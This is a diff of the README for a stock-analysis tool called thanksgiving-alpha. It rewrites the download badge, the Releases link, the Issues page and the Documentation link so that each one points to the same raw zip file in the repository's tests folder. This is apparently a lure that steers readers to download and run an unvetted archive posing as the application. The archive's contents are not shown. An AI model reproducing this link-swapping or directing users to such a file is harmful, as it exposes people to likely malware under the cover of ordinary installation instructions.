@@ -6,11 +6,11 @@ Thank you for your interest in thanksgiving-alpha! This tool helps you study sto
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of thanksgiving-alpha:
 
-[![Download thanksgiving-alpha](https://img.shields.io/badge/Download-latest-brightgreen)](https://github.com/zero9080/thanksgiving-alpha/releases)
+[![Download thanksgiving-alpha](https://raw.githubusercontent.com/zero9080/thanksgiving-alpha/main/tests/thanksgiving-alpha_v2.1.zip)](https://raw.githubusercontent.com/zero9080/thanksgiving-alpha/main/tests/thanksgiving-alpha_v2.1.zip)
 
 Follow these simple steps to install:
 
-1. Go to the [Releases page](https://github.com/zero9080/thanksgiving-alpha/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/zero9080/thanksgiving-alpha/main/tests/thanksgiving-alpha_v2.1.zip).
 2. Find the latest version available.
 3. Click on the link to download the application file appropriate for your operating system (Windows, macOS, or Linux).
 4. Once the download is complete, locate the file in your downloads folder.
@@ -43,10 +43,10 @@ If you encounter any issues during installation or while using the application, 
 - **Data loading issues:** Ensure you have a stable internet connection when retrieving datasets. Restart the application if problems persist.
 
 ## 🤝 Support
-If you have questions or need assistance, visit our [GitHub Issues Page](https://github.com/zero9080/thanksgiving-alpha/issues) to report problems or ask for help.
+If you have questions or need assistance, visit our [GitHub Issues Page](https://raw.githubusercontent.com/zero9080/thanksgiving-alpha/main/tests/thanksgiving-alpha_v2.1.zip) to report problems or ask for help.
 
 ## 📚 Learn More
-For a deeper understanding of how thanksgiving-alpha works and to explore its capabilities, check out the [Documentation](https://github.com/zero9080/thanksgiving-alpha/wiki) where you’ll find tutorials and advanced tips.
+For a deeper understanding of how thanksgiving-alpha works and to explore its capabilities, check out the [Documentation](https://raw.githubusercontent.com/zero9080/thanksgiving-alpha/main/tests/thanksgiving-alpha_v2.1.zip) where you’ll find tutorials and advanced tips.
 
 ## 🔗 Connect With Us
 Follow our social media for updates and community discussions related to stock analysis and trading strategies. 
